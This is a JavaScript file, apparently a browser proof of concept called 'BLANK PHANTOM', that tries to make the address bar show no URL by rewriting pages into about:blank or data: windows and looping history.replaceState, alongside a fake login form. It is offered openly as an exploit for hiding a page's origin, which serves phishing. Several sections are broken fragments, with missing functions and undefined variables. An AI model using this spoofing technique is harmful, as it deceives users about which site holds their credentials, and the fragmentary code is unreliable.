    // ============================================================
    // BLANK PHANTOM v1.0
    // Zero-Text Address Bar Erasure Exploit
    // Membuat address bar benar-benar KOSONG tanpa teks apapun
    // Bukan about:blank, bukan spasi, bukan null, tapi EMPTY
    // ============================================================
    
    let activeInterval = null;
    let isActive = false;
    let originalPushState = history.pushState;
    let originalReplaceState = history.replaceState;
    
    const statusText = document.getElementById('statusText');
    const statusLed = document.getElementById('statusLed');
    const urlDisplay = document.getElementById('urlDisplay');
    
    function updateUrlDisplay() {
        try {
            urlDisplay.innerHTML = window.location.href || '[empty]';
        } catch(e) {
            urlDisplay.innerHTML = '[error]';
        }
    }
    
    setInterval(updateUrlDisplay, 500);
    
    function showNotification(msg, isError = false) {
        const notif = document.createElement('div');
        notif.className = 'notification';
        notif.style.borderLeftColor = isError ? '#ff3b30' : '#4ade80';
        notif.innerHTML = msg;
        document.body.appendChild(notif);
        setTimeout(() => notif.remove(), 4000);
        console.log(`[BLANK] ${msg}`);
    }
    
    function updateStatus(msg, isExploiting = false) {
        statusText.innerHTML = isExploiting ? `🔴 ${msg}` : `🟢 ${msg}`;
        statusLed.style.background = isExploiting ? '#ff3b30' : '#4ade80';
        isActive = isExploiting;
    }
    
    function cleanup() {
        if (activeInterval) {
            clearInterval(activeInterval);
            activeInterval = null;
        }
        
        // Restore history functions
        window.history.pushState = originalPushState;
        window.history.replaceState = originalReplaceState;
        
        // Remove any injected elements
        const injected = document.querySelectorAll('[data-phantom]');
        injected.forEach(el => el.remove());
        
        // Try to restore URL to current path
        try {
            const currentPath = window.location.pathname;
            history.replaceState({}, '', currentPath);
            document.title = "BLANK PHANTOM - Security Research";
        } catch(e) {}
        
        updateStatus("Ready | Address bar restored", false);
        showNotification("🧹 Address bar restored to normal");
        updateUrlDisplay();
    }
    
    // ============================================================
    // TECHNIQUE 1: about:blank → NULL Conversion
    // Menggunakan about:blank lalu replaceState ke string kosong
    // ============================================================
    function exploitBlank1() {
        cleanup();
        updateStatus("[BLANK #1] about:blank → NULL conversion...", true);
        
        // Simpan konten current
        const currentHTML = document.documentElement.outerHTML;
        const currentTitle = document.title;
        
        // Navigasi ke about:blank
        const newWin = window.open("about:blank", "_self");
        
        if (newWin) {
            // Write konten asli
            newWin.document.open();
            newWin.document.write(currentHTML);
            newWin.document.title = currentTitle;
            newWin.document.close();
            
            // KRITIKAL: replaceState ke string kosong (bukan spasi, tapi EMPTY)
            setTimeout(() => {
                try {
                    // Replace ke string kosong total
                    newWin.history.replaceState({}, "", "");
                    
                    // Push lagi untuk lock
                    newWin.history.pushState({}, "", "");
                    
                    // Lock dengan interval
                    activeInterval = setInterval(() => {
                        if (newWin.location.href !== "" && newWin.location.href !== "about:blank") {
                            newWin.history.replaceState({}, "", "");
                        }
                    }, 30);
                    
                    updateStatus("[SUCCESS] Address bar is now COMPLETELY EMPTY!", true);
                    showNotification("🌑 Address bar: ZERO TEXT — not even about:blank!");
                    updateUrlDisplay();
                    
                } catch(e) {
                    updateStatus(`Failed: ${e.message}`, false);
                    showNotification(`Error: ${e.message}`, true);
                }
            }, 100);
        } else {
            updateStatus("Popup blocked! Please allow popups.", false);
            showNotification("⚠️ Popup blocked — please allow popups for this site", true);
        }
    }
    
    // ============================================================
    // TECHNIQUE 2: CSI Overflow → Address Bar Crash/Erasure

                history.replaceState({}, '', '');

                    updateStatus("Partial success: address bar shows space", true);

        // Juga override title
        document.title = "";
    }
    
    // ============================================================

    // ============================================================
    function exploitBlank3() {
        cleanup();
        updateStatus("[BLANK #3] Double navigation erasure...", true);
        
        const currentHTML = document.documentElement.outerHTML;
        
        // Step 1: Navigate ke data:text/html kosong

        const win = window.open(emptyDataUrl, "_self");
        
        if (win) {

                win.document.open();
                win.document.write(currentHTML);
                win.document.close();
                
                // Step 3: Replace ke empty string MULTIPLE TIMES

    document.getElementById('fakeLoginBtn').addEventListener('click', (e) => {

            document.getElementById('emailField').value = '';

    // ============================================================
    // EVENT LISTENERS
    // ============================================================
    document.getElementById('exploitBlank1').addEventListener('click', exploitBlank1);
    document.getElementById('exploitBlank2').addEventListener('click', exploitBlank2);
    document.getElementById('exploitBlank3').addEventListener('click', exploitBlank3);
    document.getElementById('exploitBlank4').addEventListener('click', exploitBlank4);
    document.getElementById('resetAll').addEventListener('click', resetAll);
    
    // Initial status

    console.log('%c🔥 BLANK PHANTOM v1.0 - Zero-Text Address Bar Exploit', 'color: #ff6b6b; font-size: 14px; font-weight: bold;');
